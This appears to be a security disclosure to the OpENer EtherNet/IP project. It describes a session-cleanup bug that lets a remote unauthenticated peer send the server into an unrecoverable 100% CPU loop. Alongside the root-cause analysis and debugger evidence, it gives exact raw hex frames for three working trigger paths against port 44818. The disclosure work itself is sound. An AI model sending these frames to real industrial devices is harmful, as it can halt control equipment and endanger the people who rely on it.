# Class 3 connection timeout closes invalid socket (-1) → unrecoverable 100% CPU infinite loop in RemoveSocketTimerFromList (remote DoS; triggerable with fully legal EtherNet/IP traffic)

## Summary

OpENer (upstream master, `fb90c99`, 2026-11-09) contains a stock-reachable EtherNet/IP session-lifecycle flaw: removing a session does not correctly close the Class 3 (explicit) connections bound to it, and the later connection-timeout close path feeds the freed session slot's value (-1) into a timer-list cleanup loop that cannot terminate on -1 — allowing a remote unauthenticated peer to permanently halt the entire service.

I found a **new security vulnerability** in **OpENer (master `fb90c99`)** affecting the **stock Class 3 explicit-connection timeout / session-close path**.

In the default TCP server flow, a client that opens **two** Class 3 connections and then removes its session — **including via a fully legal UnregisterSession, or by an ordinary well-formed message merely arriving split across TCP segments** — leaves one connection alive with a dangling session reference (a connection-list iterator invalidation in `CloseClass3ConnectionBasedOnSession()` skips every connection after the first match). When that leaked connection times out ~8–15 s later, `CloseSessionBySessionHandle()` reads the already-freed slot (-1) and `RemoveSocketTimerFromList(-1)` loops forever, because every empty timer slot stores exactly -1 by design.

As a result, a remote unauthenticated peer can, on a single TCP connection, reliably trigger:

- ~100% CPU userspace spin (process state `R`)
- total unresponsiveness to **all** traffic (TCP sessions, UDP ListIdentity)
- **unrecoverable** denial of service — only a process restart restores service

A conservative one-line description:

> OpENer does not validate the encapsulation session handle at Class 3 connection timeout, so an already-freed session slot (-1) reaches RemoveSocketTimerFromList(), whose linear search for -1 always matches empty timer slots and never terminates — a remote, unauthenticated, unrecoverable DoS reachable with fully legal EtherNet/IP traffic.

Verified on master (`fb90c99`): the wedge reproduces deterministically, with identical GDB stacks across three trigger paths; a hardware-watchpoint trace pins down the full defect chain.

---

*All findings in this report were discovered jointly by @Chauncy and me.*

## Tested environment

- **Upstream master, commit `fb90c99` (2026-11-09)**, POSIX platform, built with CMake RelWithDebInfo (i.e. `NDEBUG` defined; nothing in the faulty path depends on asserts), Linux x86_64, running in Docker, EtherNet/IP TCP port 44818. **Dynamically reproduced:**
  - dynamically reproduced on all three trigger paths (malformed declared length; fully-legal `UnregisterSession`; fully-legal split delivery) — each wedges the server within ~15 s of the client disconnecting, with the same GDB stack every time.
- The same faulty code also exists in older v2.3-era sources, where this wedge was first observed with the identical stack (comparison note under Evidence); the reproduction description above is based on master.

## How it can be triggered

No authentication is required. The precondition is one registered session with **at least two** Class 3 (explicit) connections opened via ForwardOpen (the reason for "two" is in Root cause, defect 1: only the most recently opened connection gets cleaned up; the others are leaked).

Three confirmed trigger paths, all ending in the server wedging roughly one connection-timeout period (~8–15 s on master) later:

1. **With a malformed frame**: send a SendUnitData whose encapsulation header declares a payload length larger than what is actually sent (declared ≠ actual). The server treats the message as a fragmented packet, silently discards it, returns an error, and its error handling removes the session while the connections live on (details below).
2. **Without any malformed traffic**: after the two ForwardOpens, simply send a plain, fully legal **UnregisterSession** command (verified). A legitimate client that opens ≥2 explicit connections and then unregisters its session — or drops the TCP connection in a way that reaches the same session-removal path — wedges the server with 100% spec-conformant messages.
3. **Without any malformed bytes at all**: a completely well-formed SendUnitData (declared length == actual) that merely **arrives split** — e.g. a client writing the header and the payload as two separate TCP writes, or a larger message segmented in transit — makes the server wake up with a partial message available, which takes the same "fragmented packet" discard path (verified: sending a 54-byte well-formed message as 24 + 30 bytes with a 1 s gap; no field in the message is invalid).

Then just wait for the Class 3 connection timeout.

Exact trigger frames (raw TCP bytes on port 44818). Setup shared by all three paths — send each frame and wait for its reply (both ForwardOpens succeed; the server assigns session handle 1, which the following frames reference):

```
REGISTER (0x0065)          65000400000000000000000052454749535452300000000001000000
ForwardOpen #1 (0x006F)    6f003e0001000000000000004657444f50454e3000000000000000000000020000000000b2002e00540220062401050a4433221100000000222201008877665503000000a08601000042a08601000042830220022401
ForwardOpen #2 (0x006F)    6f003e0001000000000000004657444f50454e3000000000000000000000020000000000b2002e00540220062401050a4433221100000000333301008877665503000000a08601000042a08601000042830220022401
```

Then send **one** of the three trigger payloads and close the connection:

1. **Malformed declared length** — SendUnitData whose header declares Length=100 while the body carries 30 bytes:
```
700064000100000000000000554e495444415441000000000000000000000200a100040015000000b1000a0001000e03200124013001
```
2. **Fully legal UnregisterSession**:
```
660000000100000000000000554e52454749535400000000
```
3. **Fully well-formed SendUnitData** (declared 30 == actual 30, no invalid field) — send it as two TCP writes: the first 24 bytes (the encapsulation header), then the remaining 30 bytes about 1 s apart:
```
70001e000100000000000000554e495444415441000000000000000000000200a100040015000000b1000a0001000e03200124013001
```

## Observed behavior / impact

- The server's main loop enters a userspace infinite loop: ~100% CPU (275–323 ticks measured in 3 s sampling windows on master), process state `R`.
- OpENer handles all of its EtherNet/IP traffic in a single thread, so this one loop brings down the **entire service**, not just a single connection: existing sessions, new TCP connections, and UDP ListIdentity probes all go unanswered.
- It **never recovers on its own** — no watchdog, no crash, just a silent spin; only an external process restart restores service (verified: after `docker restart` the server answers ListIdentity again).
- Remote, unauthenticated, deterministic on master — and reachable with fully legal traffic, so this is not only an attack vector: an ordinary client cycling its session with ≥2 open explicit connections can take the device down.

## Root cause

Three defects chain up. The middle one is what lets a connection survive its own session; the last one turns that into an unrecoverable hang.

**Defect 1 — session cleanup leaks connections (the poisoning).** `CloseClass3ConnectionBasedOnSession()` [encap.c:729-739] walks the active connection list and closes matching connections *while iterating* it:

```c
DoublyLinkedListNode *node = connection_list.first;
while(NULL != node) {
  CipConnectionObject *connection_object = node->data;
  if(class3 && connection_object->associated_encapsulation_session == handle) {
    connection_object->connection_close_function(connection_object);
  }
  node = node->next;   /* <-- the current node may have just been destroyed */
}
```

The close callback (`CloseConnection` → `RemoveFromActiveConnections` → `DoublyLinkedListRemoveNode` → `CipConnectionObjectListArrayFree`) unlinks the node and **memsets it to zero** [cipconnectionobject.c:80-89]. After the first match (the list head = most recently opened connection), `node->next` reads NULL from the zeroed node and the traversal stops — **every remaining Class 3 connection on that session is skipped and stays active**, holding an `associated_encapsulation_session` that points at a session slot which is already free. This runs on every session-removal path: `RemoveSession()` from the fragmented-packet error path [generic_networkhandler.c:497-501], from `UnregisterSession`, etc.

**Defect 2 — timeout close uses the stale reference without any validation.** When the leaked connection's watchdog expires, `ManageConnections()` [cipconnectionmanager.c:957] calls `Class3ConnectionTimeoutHandler()`, which calls `CloseSessionBySessionHandle()` [encap.c:644-650]:

```c
CipSessionHandle session_handle = connection_object->associated_encapsulation_session;
CloseTcpSocket(g_registered_sessions[session_handle - 1]);
```

- no check that the session slot is still live — here it holds `kEipInvalidSocket (-1)`, so `CloseTcpSocket(-1)` is called;

**Defect 3 — the cleanup loop cannot terminate on -1 (the wedge).** `CloseTcpSocket(-1)` [generic_networkhandler.c:382] calls `RemoveSocketTimerFromList(-1)` [:389-397]:

```c
while (NULL != (socket_timer = SocketTimerArrayGetSocketTimer(
        g_timestamps, OPENER_NUMBER_OF_SUPPORTED_SESSIONS, socket_handle)))
  SocketTimerClear(socket_timer);
```

`SocketTimerArrayGetSocketTimer()` [socket_timer.c:41-51] does a linear match on `socket == array[i].socket`. **Empty timer slots store exactly -1** (`SocketTimerArrayGetEmptySocketTimer()` relies on this to find free slots, typedefs.h:66), and `SocketTimerClear()` [socket_timer.c:29-32] writes -1 back. So searching for -1 always finds an "empty" slot, clearing it keeps it -1, and the while-loop can never exit — **CWE-835**. The main loop never returns; only a restart helps.

## Evidence

All three trigger paths were reproduced on master, each from a fresh restart — every reproduction wedged the server within ~15 s and produced the identical GDB stack.

**GDB backtrace of the wedged process** (identical across all captures, all trigger paths; innermost frame lands at different points of the spin loop — the search, the clear, or the loop body — as expected when sampling a busy loop):

```
#0  SocketTimerArrayGetSocketTimer (array_of_socket_timers=0x... <g_timestamps>,
    array_length=20, socket=-1) at source/src/ports/socket_timer.c:45
#1  RemoveSocketTimerFromList (socket_handle=-1) at source/src/ports/generic_networkhandler.c:391
#2  CloseTcpSocket (socket_handle=-1) at source/src/ports/generic_networkhandler.c:385
#3  CloseSessionBySessionHandle (connection_object=<optimized out>) at source/src/enet_encap/encap.c:647
#4  Class3ConnectionTimeoutHandler (connection_object=0x... <explicit_connection_object_pool>)
    at source/src/cip/cipclass3connection.c:20
#5  ManageConnections (elapsed_time=10) at source/src/cip/cipconnectionmanager.c:957
#6  NetworkHandlerProcessCyclic () at source/src/ports/generic_networkhandler.c:523
#7  executeEventLoop () at source/src/ports/POSIX/main.c:261
#8  main () at source/src/ports/POSIX/main.c:229
```

During the wedge: process state `R`, UDP ListIdentity times out, only a container restart brings the server back.

**Hardware-watchpoint trace** (defect 1 proven write-by-write; GDB watchpoints on `g_registered_sessions[0]`, both connection objects' session fields, and the connection state, during one full trigger):

| step | observed write | where |
|---|---|---|
| RegisterSession | `slot[0] = 6` (socket fd) | `HandleReceivedRegisterSessionCommand` [encap.c:471] |
| ForwardOpen #1 | `pool[0].session = 1`, state → Established | `EstablishClass3Connection` [cipclass3connection.c:38,52] |
| ForwardOpen #2 | `pool[1].session = 1` | same |
| malformed frame (or UnregisterSession) | `slot[0] = -1` | `RemoveSession` [encap.c:669] ← error path [generic_networkhandler.c:500] / UnregisterSession |
| session cleanup | `pool[1]` zeroed & removed | `CloseClass3ConnectionBasedOnSession` [encap.c:735] |
| session cleanup | **`pool[0]`: no write at all — skipped** | traversal stopped on the zeroed node |
| ~13 s later | wedge (stack above) | timeout handler reads `slot[0] == -1` |

For comparison: this wedge was first observed on an older v2.3-era build — the call chain is identical, only the line numbers differ (encap.c:816, generic_networkhandler.c:262-274, socket_timer.c:45) and the connection-timeout period was longer there (~50–60 s). The faulty code is unchanged on master.

### Related, but not a duplicate
- **#562 / CVE-2026-51535** (resource exhaustion via blocking recv; recovers when the peer disconnects) is a different mechanism and recoverable.

## Reproduction package available on request

If helpful, I can provide a ready-to-run reproduction package — Docker environment and automated trigger/monitor scripts for all three trigger paths — attached here or through any channel you prefer.
